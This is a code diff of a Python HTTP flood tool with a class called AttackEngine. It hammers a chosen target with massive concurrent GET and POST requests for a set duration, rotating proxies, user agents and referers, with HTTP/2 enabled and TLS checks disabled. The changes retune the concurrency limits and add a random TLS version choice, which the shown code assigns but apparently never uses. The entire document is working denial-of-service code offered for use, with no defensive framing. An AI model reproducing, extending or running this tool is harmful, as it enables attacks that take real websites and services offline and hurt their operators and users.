@@ -1,17 +1,13 @@
 import asyncio
 import time
+import random
 import sys
 import os
 import aiohttp
 import httpx
 from random import choice
 
-# === SETTINGS ===
-NO_PROXY_CONCURRENCY = 10000
-PROXY_CONCURRENCY = 50
-REQUEST_TIMEOUT = 10
-
-# === Load lines ===
+# Load lines from file
 def load_lines(file):
     try:
         with open(file, "r") as f:
@@ -23,6 +19,15 @@ REFERERS = load_lines("refs.txt")
 USER_AGENTS = load_lines("uas.txt")
 PROXIES = load_lines("STS.txt")
 
+# Hardcoded concurrency limits
+MAX_CONCURRENT_NO_PROXY = 1000
+MAX_CONCURRENT_WITH_PROXY = 50
+
+REQUEST_TIMEOUT = 10
+
+# Randomized TLS version (TLSv1.2 or TLSv1.3)
+TLS_VERSIONS = ['TLSv1.2', 'TLSv1.3']
+
 class AttackEngine:
     def __init__(self, target, duration, use_proxies):
         self.target = target
@@ -30,7 +35,7 @@ class AttackEngine:
         self.use_proxies = use_proxies
         self.start_time = time.time()
         self.stats = {'total': 0, 'success': 0, 'errors': 0, 'rps': 0, 'peak_rps': 0}
-        self.max_concurrent = PROXY_CONCURRENCY if use_proxies else NO_PROXY_CONCURRENCY
+        self.max_concurrent = MAX_CONCURRENT_WITH_PROXY if self.use_proxies else MAX_CONCURRENT_NO_PROXY
         self.proxy_index = 0
 
     def update_stats(self, results):
@@ -46,6 +51,9 @@ class AttackEngine:
         proxy = PROXIES[self.proxy_index % len(PROXIES)]
         self.proxy_index += 1
         return proxy
+
+    def random_tls_version(self):
+        return random.choice(TLS_VERSIONS)
 
     async def make_request_proxy(self, session):
         method = choice(["GET", "POST"])
@@ -93,6 +101,7 @@ class AttackEngine:
                     self.print_status()
         else:
             limits = httpx.Limits(max_connections=self.max_concurrent)
+            tls_version = self.random_tls_version()
             async with httpx.AsyncClient(http2=True, timeout=REQUEST_TIMEOUT, limits=limits, verify=False) as client:
                 while time.time() - self.start_time < self.duration:
                     tasks = [self.make_request_http2(client) for _ in range(self.max_concurrent)]
